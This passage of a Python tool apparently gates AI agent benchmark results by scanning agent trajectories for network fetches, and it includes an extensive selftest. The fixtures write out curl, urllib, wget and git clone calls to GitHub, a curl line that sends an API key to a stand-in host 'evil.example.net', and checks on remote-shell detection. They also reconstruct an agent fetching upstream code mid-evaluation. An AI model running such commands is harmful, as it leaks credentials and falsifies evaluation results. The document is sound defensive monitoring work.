        say(f"REFUSED: {len(contaminated)} of {len(verdicts)} rows are "
            "CONTAMINATED -- the agent retrieved from the network.")
        say()
        for entry in contaminated:
            say(f"  {entry['item_id']}")
            say(f"    hosts   : {', '.join(entry['violation_hosts']) or '?'}")
            say(f"    run line: {', '.join(str(n) for n in entry['lines'])}")
            shown = 0
            for attempt in entry["attempts"]:
                violations = [hit for hit in attempt["hits"]
                              if hit["verdict"] == VIOLATION]
                if not violations:
                    continue
                say(f"    attempt : {attempt['dir']}  "
                    f"({len(violations)} violation hits)")
                for hit in violations:
                    if shown >= max_snippets:
                        break
                    shown += 1
                    say(f"      {hit['event']} [{hit['kind']}/"
                        f"{hit['category']}] {hit['host']}")
                    say(f"        {hit['snippet']}")
            if shown >= max_snippets:
                say(f"      ... ({entry['n_violations']} violation hits in "
                    "total; the full evidence is in the quarantine sidecar)")
            say()

    if unassessed:
        say(f"NOT ASSESSED: {len(unassessed)} item(s) have no trajectory "
            "directory on disk.")
        say("  A row the gate could not read is not a row the gate cleared.")
        for entry in unassessed[:10]:
            say(f"    {entry['item_id']}")
        if len(unassessed) > 10:
            say(f"    ... and {len(unassessed) - 10} more")
        say()

    if unassessable:
        say(f"UNASSESSABLE: {len(unassessable)} of {len(verdicts)} rows "
            "cannot be given a verdict either way.")
        say("  Not scored is not zero: these rows are refused, not cleared.")
        if any(entry["n_raw_suspects"] for entry in unassessable):
            say("  A `! raw sweep` line is a byte-match in a file this gate "
                "could not parse:")
            say("  evidence that the scan was incomplete, NOT evidence that "
                "the agent retrieved anything.")
        for entry in unassessable[:10]:
            say(f"    {entry['item_id']}")
            for reason in entry["unassessable_reasons"][:3]:
                say(f"      - {reason}")
            extra = len(entry["unassessable_reasons"]) - 3
            if extra > 0:
                say(f"      - ... and {extra} more reason(s)")
            for hit in [h for attempt in entry["attempts"]
                        for h in attempt["hits"] if h["kind"] == "raw"][:2]:
                say(f"      ! raw sweep [{hit['category']}] "
                    f"{hit['host'] or '?'}: {hit['snippet']}")
        if len(unassessable) > 10:
            say(f"    ... and {len(unassessable) - 10} more")
        say()

    if superset:
        say(f"NOTE: {len(superset)} assessed row(s) sit in an attempt "
            "directory that has grown since the row was scored.")
        say("  Read as a SUPERSET of what was scored, which can only find "
            "more, so it is not a conservation failure.")
        for entry in superset[:5]:
            grown = entry["superset"][0]
            say(f"    {entry['item_id']}: recorded {grown['recorded']} "
                f"events, {grown['on_disk']} on disk ({grown['dir']})")
        if len(superset) > 5:
            say(f"    ... and {len(superset) - 5} more")
        say()

    # Raw hits in PRESERVED NATIVE FILES, on rows that are otherwise
    # assessable.  They are counted as raw suspects, which the SUSPECT
    # section above deliberately excludes -- so without this block a URL in a
    # chat transcript would be a number in a counter nobody prints.  A note,
    # not a refusal: bytes in a transcript cannot say a fetch ran, and for a
    # framework with no shell tool it could not have.
    native_flagged = sorted(
        (entry for entry in verdicts.values()
         if not entry["unassessable"] and any(
             hit["kind"] == "raw" and hit.get("tool") == "native-file"
             for attempt in entry["attempts"] for hit in attempt["hits"])),
        key=lambda entry: entry["item_id"])
    if native_flagged:
        say(f"NATIVE: {len(native_flagged)} assessed row(s) have a raw-sweep "
            "hit in a preserved native file.")
        say("  Reported for a human, capped at SUSPECT: a transcript byte is "
            "the model TALKING about a host, not a recorded fetch.")
        for entry in native_flagged[:10]:
            shown = 0
            for attempt in entry["attempts"]:
                for hit in attempt["hits"]:
                    if (hit["kind"] != "raw"
                            or hit.get("tool") != "native-file"
                            or shown >= 2):
                        continue
                    shown += 1
                    say(f"    {entry['item_id']}  [{hit['category']}] "
                        f"{hit['host'] or '?'}: {hit['snippet']}")
        if len(native_flagged) > 10:
            say(f"    ... and {len(native_flagged) - 10} more")
        say()

    # What the gate decided NOT to see, printed immediately before the verdict
    # it was decided under.  This block is the whole accountability story for
    # the position exemptions: a detector that narrows itself in silence cannot
    # be argued with, and a CLEAN reached by looking away has to say so on the
    # same page as the CLEAN.  Printed only when the rule actually suppressed
    # something, which is what keeps every archived gate output byte-identical
    # -- the archived corpus contains no matching position at all.
    #
    # THE HOST ROSTER IS COMPLETE AND IS NEVER TRUNCATED, and that is the fix
    # for the way this block was first written (review, 2026-08-03).  It listed
    # ten items and two records each, with no "... and N more" on the inner
    # cut; on an OOXML arm, where nearly every row exempts a namespace by
    # construction, the ONE anomalous host is systematically the one below the
    # fold.  Reviewers built a 12-item run in which this gate exited 0 with the
    # suppressed host printed NOWHERE.  A suppressed host the operator cannot
    # read is a suppressed host the gate did not report, and "this block
    # reports" is the entire argument for holding EGRESS_GATE_VERSION at 4.
    # Records are already deduplicated per (host, position) per item, so the
    # roster's length is the number of distinct namespaces the run named -- one
    # line on an OOXML corpus.  If a run ever names five hundred, five hundred
    # lines is not noise, it IS the finding.  Only the per-item DETAIL below
    # the roster is capped, it says how many it is showing of how many, and
    # every host it cuts is named in the roster above it.
    exempted = sorted((entry for entry in verdicts.values()
                       if entry["exempt"]),
                      key=lambda entry: entry["item_id"])
    if exempted:
        records = [(entry, record) for entry in exempted
                   for record in entry["exempt"]]
        n_exempt = sum(record["n"] for _entry, record in records)
        rules_used = {record["rules"] for _entry, record in records}
        roster = {}
        for entry, record in records:
            seen_host = roster.setdefault(
                (record["host"] or "?", record["position"]),
                {"n": 0, "items": set()})
            seen_host["n"] += record["n"]
            seen_host["items"].add(entry["item_id"])
        say(f"EXEMPT: {len(exempted)} item(s) name a URI in a syntactic "
            f"position that cannot be a fetch ({n_exempt} occurrence(s)).")
        if NAMESPACE_EXEMPTION_RULES in rules_used:
            say(f"  Rule {NAMESPACE_EXEMPTION_RULES}: an XML namespace URI "
                "is an identifier, not a target -- `{uri}tag`,")
            say("  Clark notation, and nothing else. NOT counted as egress.")
        if TEST_DATA_LITERAL_RULES in rules_used:
            say(f"  Rule {TEST_DATA_LITERAL_RULES}: an http(s) URL on "
                "example.com/.net/.org in the first address")
            say("  argument of `paragraph.add_hyperlink(...)` is document "
                "test data, not a request. NOT counted as egress.")
        say("  Every exemption is off in any text where another detector "
            "fired, so curl/requests/urlopen to")
        say("  the same host are still hits.")
        say(f"  EVERY host it suppressed, complete ({len(roster)} distinct):")
        for (host, position), seen_host in sorted(roster.items()):
            say(f"    [{position}] {host} x{seen_host['n']} "
                f"in {len(seen_host['items'])} item(s)")
        shown = records[:10]
        say(f"  Disagree by reading these ({len(records)} record(s) over "
            f"{len(exempted)} item(s), showing {len(shown)}):")
        for entry, record in shown:
            say(f"    {entry['item_id']}  [{record['position']}] "
                f"{record['host'] or '?'} x{record['n']}")
            say(f"      {record['snippet']}")
        if len(records) > len(shown):
            say(f"    ... and {len(records) - len(shown)} more record(s) -- "
                "every host they name is in the roster above")
        say()

    if quarantine_out:
        try:
            split = quarantine(run_jsonl, verdicts, quarantine_out)
        except ValueError as exc:
            say(str(exc))
            return 2
        say(f"quarantine: {split['kept']} rows -> {split['out']}")
        say(f"            {split['removed']} rows -> {split['quarantined']} "
            "(with evidence)")
        say()

    say(PROXY_PREVENTION if proxy_attempts is not None else NOT_PREVENTION)
    say()
    if not with_dirs:
        say("REFUSED (3): nothing was assessed. No row in this run file has a "
            "trajectory under the given root, so a clean verdict here would "
            "be about the empty set.")
        return 3
    if contaminated:
        say(f"REFUSED (1): {len(contaminated)} contaminated row(s). This run "
            "file may not be released as an agent capability result.")
        return 1
    if unassessable and not allow_unassessed:
        say(f"REFUSED (4): {len(unassessable)} of {len(verdicts)} row(s) are "
            "unassessable. The gate could not read their evidence, so it has "
            "not cleared them -- a CLEAN here would be about the rows that "
            "happened to be readable. Re-run those items, restore their "
            "trajectories, or pass --allow-unassessed and say in the write-up "
            "that the arm was gated on a subset.")
        return 4
    if unassessable:
        say(f"--allow-unassessed: {len(unassessable)} unassessable row(s) "
            "were NOT gated. This result covers "
            f"{len(assessed)} of {len(verdicts)} rows.")
    say(f"CLEAN (0): no violation recorded in {n_attempts} attempt dirs / "
        f"{n_events} events.")
    return 0


# ------------------------------------------------------------------ selftest

def _event(directory: str, index: int, payload: dict) -> str:
    """Write one event file the way the SDK does, so the walker is exercised."""
    events = os.path.join(directory, "events")
    os.makedirs(events, exist_ok=True)
    path = os.path.join(events,
                        f"event-{index:05d}-0000000{index}-aaaa-bbbb.json")
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(payload, handle)
    return path


def _terminal(directory: str, index: int, command: str, output: str = "",
              event_id: Optional[str] = None) -> None:
    """An agent terminal call and the observation it produced."""
    event_id = event_id or f"act-{index}"
    # `tool_call.arguments` carries the same command as `action.command`, the
    # way the SDK really writes it -- so every fixture below also exercises
    # the deduplication that stops one command being reported twice.
    _event(directory, index,
           {"id": event_id, "kind": "ActionEvent", "source": "agent",
            "tool_name": "terminal", "tool_call_id": f"call-{index}",
            "action": {"command": command, "kind": "TerminalAction"},
            "tool_call": {"id": f"call-{index}", "name": "terminal",
                          "arguments": json.dumps({"command": command,
                                                   "security_risk": "LOW"})}})
    if output:
        _event(directory, index + 1,
               {"id": f"obs-{index}", "kind": "ObservationEvent",
                "source": "environment", "parent_id": event_id,
                "tool_name": "terminal", "tool_call_id": f"call-{index}",
                "observation": {"kind": "TerminalObservation",
                                "content": [{"type": "text", "text": output}]}})


def selftest() -> int:
    """The detector, the policy, the run-file mapping and the gate.

    Most cases are built from synthetic events in a temporary directory.
    The last three run against the two trajectories committed under
    `egress_fixtures/`, hand-written to the shape of the 2026-08-01 C1.5
    incident and of a C3 attempt on the same project (they are
    reconstructions, not archived evidence -- see
    `egress_fixtures/PROVENANCE.md`): a detector shown firing only on
    fixtures a check wrote three lines earlier has never been read across a
    whole attempt tree.
    """
    import shutil
    import tempfile

    ok = True

    def check(name, cond, detail=""):
        nonlocal ok
        print(f"  [{'PASS' if cond else 'FAIL'}] {name}"
              + (f" -- {detail}" if detail and not cond else ""))
        ok = ok and bool(cond)

    endpoint = "api.deepseek.com"
    policy = Policy(allow=frozenset({endpoint}))
    tmp = tempfile.mkdtemp(prefix="r2t-egress-")
    try:
        root = os.path.join(tmp, "trajectories", "c1.5")

        # ---- a clean trajectory.  Deliberately full of the things that make a
        # naive detector fire: a licence-header URL in a file the agent WROTE,
        # and the same header echoed back by `cat`.
        licence = ("<?php\n/*\n * @copyright Copyright (c) CoreShop GmbH "
                   "(https://www.coreshop.com)\n * @license "
                   "https://www.coreshop.com/license\n */\n")
        clean = os.path.join(root, "aaaaaaaaaaaaaaa1", "conv1")
        _terminal(clean, 1, "ls -la src/CoreShop/Behat/Context",
                  "CartContext.php\nStoreContext.php")
        _terminal(clean, 3, "cat src/CoreShop/Behat/Context/CartContext.php",
                  licence)
        _event(clean, 5,
               {"id": "act-5", "kind": "ActionEvent", "source": "agent",
                "tool_name": "file_editor", "tool_call_id": "call-5",
                "action": {"command": "create", "kind": "FileEditorAction",
                           "path": "/w/T.php", "file_text": licence}})
        report = scan_trajectory(clean)
        check("a clean trajectory reports no hits",
              report["n_hits"] == 0 and report["hosts"] == [],
              json.dumps(report["hits"])[:300])
        check("...and still says how much it read",
              report["n_events"] == 5 and report["n_actions"] == 3
              and report["present"], json.dumps(
                  {k: report[k] for k in ("n_events", "n_actions")}))
        check("a licence URL in a file the agent WROTE is not egress",
              not any(hit["category"] == "network_code_written"
                      for hit in report["hits"]))

        # ---- curl to the model endpoint: a network call, and a permitted one.
        allowed = os.path.join(root, "aaaaaaaaaaaaaaa2", "conv1")
        _terminal(allowed, 1,
                  f"curl -s https://{endpoint}/v1/models | head -5",
                  '{"data":[{"id":"deepseek-v4-pro"}]}')
        decided = classify(scan_trajectory(allowed), policy)
        check("curl to the model endpoint is seen at all",
              decided["n_hits"] >= 1 and decided["hosts"] == [endpoint],
              json.dumps(decided["hits"])[:300])
        check("...and classified permitted, not violation",
              decided["n_violations"] == 0 and not decided["contaminated"]
              and decided["verdicts"][PERMITTED] >= 1,
              json.dumps(decided["verdicts"]))
        check("a subdomain of an allowed host is allowed",
              policy.verdict_for("eu." + endpoint, "http_client") == PERMITTED)
        check("the PARENT of an allowed host is NOT allowed",
              policy.verdict_for("deepseek.com", "http_client") == VIOLATION)

        # ---- the real incident, reproduced in miniature.
        fetch = os.path.join(root, "aaaaaaaaaaaaaaa3", "conv1")
        _terminal(fetch, 1, (
            "python3 - <<'PY'\nimport urllib.request\nurl = "
            "'https://raw.githubusercontent.com/coreshop/CoreShop/2026.x/src/"
            "CoreShop/Behat/Context/Setup/CartPriceRuleContext.php'\n"
            "print(urllib.request.urlopen(url, timeout=10).read().decode())\n"
            "PY"),
            "<?php\nfinal class CartPriceRuleContext implements Context\n{")
        decided = classify(scan_trajectory(fetch), policy)
        check("a urllib fetch of raw.githubusercontent is a violation",
              decided["contaminated"] and decided["n_violations"] >= 1
              and decided["violation_hosts"] == ["raw.githubusercontent.com"],
              json.dumps(decided["violation_hosts"]))
        check("...categorised by the client it used",
              any(hit["category"] == "python_http" and hit["kind"] == "action"
                  for hit in decided["hits"]),
              json.dumps([hit["category"] for hit in decided["hits"]]))
        check("...and the RESPONSE is reported beside the request",
              any(hit["kind"] == "response"
                  and hit["host"] == "raw.githubusercontent.com"
                  for hit in decided["hits"]),
              json.dumps(decided["hits"])[:400])
        check("the snippet quotes the URL and stays inside the budget",
              all(len(hit["snippet"]) <= SNIPPET_MAX
                  for hit in decided["hits"])
              and any("raw.githubusercontent.com" in hit["snippet"]
                      for hit in decided["hits"]),
              str([len(hit["snippet"]) for hit in decided["hits"]]))

        # ---- git, in both spellings.
        cloned = os.path.join(root, "aaaaaaaaaaaaaaa4", "conv1")
        _terminal(cloned, 1,
                  "cd /tmp && git clone --depth 1 "
                  "https://github.com/coreshop/CoreShop.git upstream",
                  "Cloning into 'upstream'...\nReceiving objects: 100% (912)")
        _terminal(cloned, 3, "git clone git@gitlab.example.org:x/y.git m", "")
        decided = classify(scan_trajectory(cloned), policy)
        check("git clone over https is a violation, by host",
              "github.com" in decided["violation_hosts"],
              json.dumps(decided["violation_hosts"]))
        check("git clone over scp-syntax is a violation too",
              "gitlab.example.org" in decided["violation_hosts"],
              json.dumps(decided["violation_hosts"]))
        check("cloning is categorised as git_remote, not as a bare URL",
              any(hit["category"] == "git_remote" for hit in decided["hits"]),
              json.dumps([hit["category"] for hit in decided["hits"]]))

        # ---- a network call whose destination the trajectory does not record.
        vague = os.path.join(root, "aaaaaaaaaaaaaaa5", "conv1")
        _terminal(vague, 1, "echo see http:// for the mirror list", "")
        _terminal(vague, 3, 'curl -s "$MIRROR/tree.json" -o /tmp/t.json', "")
        decided = classify(scan_trajectory(vague), policy)
        check("a bare http:// with no parseable host is a SUSPECT",
              decided["n_suspects"] >= 1 and decided["n_violations"] == 0,
              json.dumps(decided["verdicts"]))
        check("...and a suspect does NOT quietly become permitted",
              all(hit["verdict"] != PERMITTED for hit in decided["hits"]),
              json.dumps([hit["verdict"] for hit in decided["hits"]]))
        check("a curl to a shell variable is seen even with no URL at all",
              any(hit["category"] == "http_client" for hit in decided["hits"]),
              json.dumps([hit["category"] for hit in decided["hits"]]))
        nested = os.path.join(root, "aaaaaaaaaaaaaaa9", "conv1")
        _terminal(nested, 1, 'bash -c "curl -sL $UPSTREAM -o /tmp/a.php"', "")
        check("a client nested inside bash -c is still seen",
              classify(scan_trajectory(nested), policy)["n_suspects"] >= 1,
              json.dumps(scan_trajectory(nested)["hits"])[:200])

        # The request must stay visible even when the SDK could not parse the
        # action it recorded -- `tool_call.arguments` is the model's own text.
        unparsed = os.path.join(root, "aaaaaaaaaaaaaab0", "conv1")
        _event(unparsed, 1, {
            "id": "act-1", "kind": "ActionEvent", "source": "agent",
            "tool_name": "terminal", "tool_call_id": "call-1",
            "action": {"kind": "TerminalAction"},
            "tool_call": {"name": "terminal", "arguments": json.dumps(
                {"command": "wget https://raw.githubusercontent.com/x/y.php"})}})
        decided = classify(scan_trajectory(unparsed), policy)
        check("a command only tool_call.arguments recorded is still found",
              decided["violation_hosts"] == ["raw.githubusercontent.com"],
              json.dumps(decided["hits"])[:300])
        check("...and a command recorded TWICE is reported once",
              len([hit for hit in classify(scan_trajectory(fetch),
                                           policy)["hits"]
                   if hit["kind"] == "action"]) == 1,
              json.dumps(classify(scan_trajectory(fetch), policy)["hits"])[:300])
        check("a suspect fails the gate under a strict policy",
              classify(scan_trajectory(vague),
                       Policy(allow=frozenset({endpoint}),
                              strict_suspect=True))["contaminated"])
        # The reason binary names are matched in COMMAND position only.
        by_name = dict(_DETECTORS)
        check("cat ~/.ssh/config is not a remote shell",
              by_name["remote_shell"].search("cat ~/.ssh/config") is None)
        check("`ssh host` after a pipe still is",
              by_name["remote_shell"].search("true && ssh box uptime")
              is not None)
        check("shipping is not ping",
              by_name["dns_probe"].search("grep shipping features/") is None)

        # ---- redaction.  The key must not survive into the report.
        key = "sk-abcdef0123456789abcdef0123456789"
        keyed = os.path.join(root, "aaaaaaaaaaaaaaa6", "conv1")
        _terminal(keyed, 1,
                  f"curl -H 'Authorization: Bearer {key}' "
                  f"https://{endpoint}/v1/chat/completions",
                  f"MODEL_API_KEY={key}\n{{\"error\":\"quota\"}}")
        _terminal(keyed, 3,
                  f"curl 'https://evil.example.net/x?api_key={key}'", "")
        report = scan_trajectory(keyed, secrets=[key])
        blob = json.dumps(report)
        check("the api key never reaches the report", key not in blob,
              blob[:300])
        check("...nor does it survive in the observation that echoed it",
              "abcdef0123456789" not in blob)
        check("redaction leaves the evidence readable",
              _REDACTED in blob and endpoint in blob
              and "evil.example.net" in report["hosts"],
              json.dumps(report["hosts"]))
        check("a pattern-only secret is scrubbed with no secrets list",
              key not in json.dumps(scan_trajectory(keyed)))

        # ---- an observation that gives away a fetch its command hid.
        hidden = os.path.join(root, "aaaaaaaaaaaaaaa7", "conv1")
        _terminal(hidden, 1, "python3 /tmp/helper.py",
                  "Cloning into 'upstream'...\nremote: Enumerating objects: 41")
        decided = classify(scan_trajectory(hidden), policy)
        check("a transfer marker in an observation is an independent finding",
              decided["n_hits"] >= 1
              and any(hit["category"].endswith("_unattributed")
                      for hit in decided["hits"]),
              json.dumps(decided["hits"])[:300])

        # ---- writing a fetcher is reported, and separately from running one.
        wrote = os.path.join(root, "aaaaaaaaaaaaaaa8", "conv1")
        _event(wrote, 1,
               {"id": "act-1", "kind": "ActionEvent", "source": "agent",
                "tool_name": "file_editor", "tool_call_id": "call-1",
                "action": {"command": "create", "kind": "FileEditorAction",
                           "path": "/tmp/helper.py",
                           "file_text": "import urllib.request\n"
                                        "urllib.request.urlopen("
                                        "'https://raw.githubusercontent.com/x')"}})
        decided = classify(scan_trajectory(wrote), policy)
        check("network code WRITTEN to a file is reported",
              any(hit["category"] == "network_code_written"
                  for hit in decided["hits"])
              and decided["violation_hosts"] == ["raw.githubusercontent.com"],
              json.dumps(decided["hits"])[:300])

        # ===================== a reserved hyperlink address is test data
        #
        # The two live A5 cell-4 false positives were code that puts an IANA-
        # reserved address into a python-docx relationship.  add_hyperlink
        # never dereferences that address.  Pin the literal family and both
        # observed spellings before exercising the full trajectory/reporting
        # path below.
        example_forms = (
            'paragraph.add_hyperlink("https://example.com", "link")',
            "paragraph.add_hyperlink('http://example.net/path', 'link')",
            "paragraph.add_hyperlink(\n"
            "    'http://example.org/{}'.format(idx + 1),\n"
            "    'link{}'.format(idx + 1),\n)",
            'paragraph.add_hyperlink(f"https://example.com/{idx}", "link")',
        )
        for index, form in enumerate(example_forms):
            old = _detect(form)
            spans = _test_data_literal_exemptions(form)
            check(f"example hyperlink form {index + 1} reproduces the old "
                  "bare-URL false positive and is now position-exempt",
                  [category for category, _s, _e in old]
                  == ["url_in_command"]
                  and len(spans) == 1
                  and _detect(form, spans) == []
                  and _hosts_in(form, "url_in_command", spans) == [],
                  json.dumps({"old": old, "spans": spans}))

        example_cmd = (
            "python3 - <<'PY'\n"
            "from docx import Document\n"
            "paragraph = Document().add_paragraph()\n"
            "paragraph.add_hyperlink(\n"
            "    'http://example.com/{}'.format(idx + 1),\n"
            "    'link{}'.format(idx + 1),\n"
            ")\nPY")
        example_item = "python-docx/features/hlk-props.feature:12"
        example_dir = os.path.join(root, item_key(example_item), "conv1")
        _terminal(example_dir, 1, example_cmd, "")
        example_report = scan_trajectory(example_dir)
        check("a parsed command using the live multiline constructor has no "
              "egress hit",
              example_report["n_hits"] == 0
              and example_report["hosts"] == [],
              json.dumps(example_report["hits"])[:300])
        check("...and records the exact host, position and separately-versioned "
              "rule instead of suppressing silently",
              len(example_report["exempt"]) == 1
              and example_report["exempt"][0]["host"] == "example.com"
              and example_report["exempt"][0]["position"]
              == "paragraph.add_hyperlink-address"
              and example_report["exempt"][0]["rules"]
              == TEST_DATA_LITERAL_RULES,
              json.dumps(example_report["exempt"]))

        # The exemption is a complete syntax position, not an example-domain
        # allowlist.  Every near miss remains visible, including the prefix-
        # host form that would be exploitable if the authority boundary were
        # not part of the regex.
        for label, command, host in (
                ("bare literal", 'print("https://example.com/gold.py")',
                 "example.com"),
                ("different receiver",
                 'link.add_hyperlink("https://example.com", "x")',
                 "example.com"),
                ("second argument",
                 'paragraph.add_hyperlink("local", "https://example.com")',
                 "example.com"),
                ("non-reserved host",
                 'paragraph.add_hyperlink("https://evil.invalid/x", "x")',
                 "evil.invalid"),
                ("reserved-host prefix",
                 'paragraph.add_hyperlink("https://example.com.evil.invalid/x", '
                 '"x")', "example.com.evil.invalid")):
            spans = _command_exemptions(command)
            check(f"{label} is outside the constructor-literal rule and stays "
                  "visible",
                  spans == [] and _detect(command, spans)
                  and [h for h, _s, _e
                       in _hosts_in(command, "url_in_command", spans)]
                  == [host],
                  json.dumps({"spans": spans,
                              "hosts": _hosts_in(command, "url_in_command",
                                                  spans)}))

        # Kill-switch: even a syntactically valid test-data literal loses its
        # exemption if the same text names a fetcher.  Then pin the three
        # explicitly requested clients independently, so no refactor can turn
        # this into a global example.com allowlist.
        mixed_fetch = (
            'paragraph.add_hyperlink("https://example.com", "x")\n'
            'requests.get("https://example.com/gold.py")')
        check("a fetch primitive anywhere in the same text disables the "
              "hyperlink exemption",
              _test_data_literal_spans(mixed_fetch)
              and _command_exemptions(mixed_fetch) == []
              and any(category == "python_http"
                      for category, _s, _e in _detect(mixed_fetch)),
              json.dumps(_detect(mixed_fetch)))
        for label, command, category in (
                ("curl", "curl -s https://example.com/gold.py",
                 "http_client"),
                ("requests", "requests.get('https://example.com/gold.py')",
                 "python_http"),
                ("urlopen", "urllib.request.urlopen("
                 "'https://example.com/gold.py')", "python_http")):
            spans = _command_exemptions(command)
            fired = _detect(command, spans)
            check(f"a real {label} call to example.com still fires",
                  spans == []
                  and any(seen == category for seen, _s, _e in fired)
                  and [host for host, _s, _e
                       in _hosts_in(command, category, spans)]
                  == ["example.com"],
                  json.dumps(fired))

        import io as _io
        example_run = os.path.join(tmp, "example-literal.jsonl")
        with open(example_run, "w", encoding="utf-8") as handle:
            handle.write(json.dumps({"item_id": example_item,
                                     "condition": "c1.5"}) + "\n")
        example_buf = _io.StringIO()
        example_rc = gate(example_run, root,
                          Policy(allow=frozenset({endpoint}),
                                 strict_suspect=True), out=example_buf)
        check("a run whose only URL is hyperlink test data passes --strict",
              example_rc == 0, example_buf.getvalue()[-600:])
        check("...and the gate prints the rule, position and suppressed host",
              TEST_DATA_LITERAL_RULES in example_buf.getvalue()
              and "paragraph.add_hyperlink-address" in example_buf.getvalue()
              and "example.com" in example_buf.getvalue(),
              example_buf.getvalue()[-900:])

        # ================================ an XML namespace URI is not a fetch
        #
        # Every case below is REPRODUCED against the un-narrowed detector
        # first: `_detect(text)` with no exemption is exactly the code that
        # refused `python-docx/features/doc-styles.feature:7` on 2026-08-03,
        # so each check states what the gate used to do and what it does now.
        ns = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
        # The real command, down to the escaped inner quotes: `python3 -c` with
        # a double-quoted script, so every Clark name reads `\"{...}` inside.
        clark_cmd = (
            'python3 -c "\n'
            'import zipfile\n'
            "zf = zipfile.ZipFile('features/steps/test_files/"
            "sty-having-styles-part.docx')\n"
            "print('styles part:', zf.namelist())\n"
            "if 'word/styles.xml' in zf.namelist():\n"
            "    from lxml import etree\n"
            "    doc = etree.parse(zf.open('word/styles.xml'))\n"
            "    styles = doc.findall('.//{" + ns + "}style')\n"
            "    for s in styles:\n"
            "        print(s.get(\\\"{" + ns + "}styleId\\\"), "
            "s.findtext(\\\"{" + ns + "}name\\\"))\n"
            '"')
        bare = _detect(clark_cmd)
        check("REPRO: without the exemption the XPath is read as a fetch",
              [category for category, _s, _e in bare] == ["url_in_command"]
              and [host for host, _s, _e
                   in _hosts_in(clark_cmd, "url_in_command")]
              == ["schemas.openxmlformats.org"],
              json.dumps(bare))
        spans = _namespace_exemptions(clark_cmd)
        check("...and WITH it the same text names no fetch at all",
              spans and _detect(clark_cmd, spans) == []
              and _hosts_in(clark_cmd, "url_in_command", spans) == [],
              json.dumps([span[2] for span in spans]))

        xpath = os.path.join(root, item_key("docx/doc-styles.feature:7"),
                             "conv1")
        _terminal(xpath, 1, clark_cmd,
                  "styles part: ['word/styles.xml']\nTraceback (most recent "
                  "call last):\nModuleNotFoundError: No module named 'lxml'")
        report = scan_trajectory(xpath)
        check("the real doc-styles.feature:7 trajectory reports NO hit",
              report["n_hits"] == 0 and report["hosts"] == [],
              json.dumps(report["hits"])[:400])
        check("...and the paired observation is not reported either",
              not any(hit["kind"] == "response" for hit in report["hits"]))
        check("...and the exemption is RECORDED, with host and position",
              len(report["exempt"]) == 1
              and report["exempt"][0]["host"] == "schemas.openxmlformats.org"
              and report["exempt"][0]["position"] == "clark-notation"
              and report["exempt"][0]["n"] == report["n_exempt"] == 3
              and report["exempt"][0]["rules"] == NAMESPACE_EXEMPTION_RULES,
              json.dumps(report["exempt"]))

        # The narrowing is not allowed to be silent, and it is not allowed to
        # be quiet about a CLEAN either: the gate prints what it looked away
        # from, on the same page as the verdict it reached.
        strict = Policy(allow=frozenset({endpoint}), strict_suspect=True)
        xpath_run = os.path.join(tmp, "namespace.jsonl")
        with open(xpath_run, "w", encoding="utf-8") as handle:
            handle.write(json.dumps({"item_id": "docx/doc-styles.feature:7",
                                     "condition": "c1.5"}) + "\n")
        buf = _io.StringIO()
        rc = gate(xpath_run, root, strict, out=buf)
        check("a run whose only finding was a namespace URI passes --strict",
              rc == 0, buf.getvalue()[-500:])
        check("...and the gate PRINTS what it exempted, and under which rule",
              "EXEMPT:" in buf.getvalue()
              and NAMESPACE_EXEMPTION_RULES in buf.getvalue()
              and "clark-notation" in buf.getvalue()
              and "schemas.openxmlformats.org" in buf.getvalue(),
              buf.getvalue()[-800:])

        # ---- ...and it prints EVERY host, not the first ten rows' first two.
        # Review's demonstration, rebuilt: an OOXML arm exempts a namespace on
        # nearly every row, so an anomalous host is systematically below any
        # fold.  Twelve items whose twelfth also names a host nobody expects,
        # and one item naming four hosts at once -- if either host can hide,
        # the gate's exemption block is not the evidence that the version-hold
        # argument spends.  `odd` is deliberately alphabetically LAST, so a
        # sorted roster does not accidentally rescue it.
        odd = "zz-unexpected.example.org"
        wide_root = os.path.join(tmp, "trajectories", "wide")
        wide_run = os.path.join(tmp, "wide.jsonl")
        with open(wide_run, "w", encoding="utf-8") as handle:
            for index in range(12):
                item = f"docx/wide-{index:02d}.feature:1"
                where = os.path.join(wide_root, item_key(item), "conv1")
                script = ("python3 -c \"print(doc.findall('.//{" + ns
                          + "}style'))\"")
                if index == 11:
                    script += ("\npython3 -c \"print(t.find('{http://" + odd
                               + "/features/steps/styles.py}z'))\"")
                _terminal(where, 1, script, "")
                handle.write(json.dumps({"item_id": item,
                                         "condition": "c1.5"}) + "\n")
            four = "docx/wide-four.feature:1"
            four_dir = os.path.join(wide_root, item_key(four), "conv1")
            for index, host in enumerate(("purl.org/dc/elements/1.1/",
                                          "www.w3.org/1999/xhtml",
                                          odd + "/gold/steps.py")):
                _terminal(four_dir, 1 + index * 2,
                          "python3 -c \"print(x.find('{http://" + host
                          + "}q'))\"", "")
            _terminal(four_dir, 9,
                      "python3 -c \"print(x.find('{" + ns + "}style'))\"", "")
            handle.write(json.dumps({"item_id": four,
                                     "condition": "c1.5"}) + "\n")
        buf = _io.StringIO()
        rc = gate(wide_run, wide_root, strict, out=buf)
        printed = buf.getvalue()
        check("13 exempting items and 4 namespaces still pass --strict",
              rc == 0 and "EXEMPT: 13 item(s)" in printed, printed[-600:])
        detail = printed[printed.find("Disagree by reading these"):]
        check("...and EVERY suppressed host is named, fold or no fold",
              "complete (4 distinct)" in printed
              and f"[clark-notation] {odd} x2 in 2 item(s)" in printed
              and "purl.org x1" in printed and "www.w3.org x1" in printed,
              printed[printed.find("EXEMPT:"):][:900])
        check("...and the roster is what does it: the fold really does cut",
              odd not in detail,
              detail[:900])
        check("...and the detail block says how much of itself it is showing",
              "17 record(s) over 13 item(s), showing 10" in printed
              and "... and 7 more record(s)" in printed,
              detail[-400:])

        # ---- the exemption is a POSITION, never a host.  The same host in a
        # position that CAN be a fetch is still a hit, in every spelling.
        def _still_seen(name, command):
            where = os.path.join(root, "ns" + name, "conv1")
            _terminal(where, 1, command, "")
            return classify(scan_trajectory(where), policy)

        for name, command in (
                ("curl", "curl -sL http://schemas.openxmlformats.org/"
                         "wordprocessingml/2006/main -o ns.xml"),
                ("wget", "wget https://schemas.openxmlformats.org/x"),
                ("urlopen", "python3 -c \"import urllib.request; "
                            "urllib.request.urlopen("
                            "'https://schemas.openxmlformats.org/x')\""),
                # A bare URL with no client named: the catch-all's whole job,
                # and the exemption must not touch it.
                ("bare", "echo http://schemas.openxmlformats.org/x >> notes"),
                # `{...}` IS curl's own glob syntax, so a Clark-looking target
                # in a curl really does fetch `.../ab`.  The exemption is off
                # here because `http_client` fired, which is the rule that
                # keeps this from being an evasion.
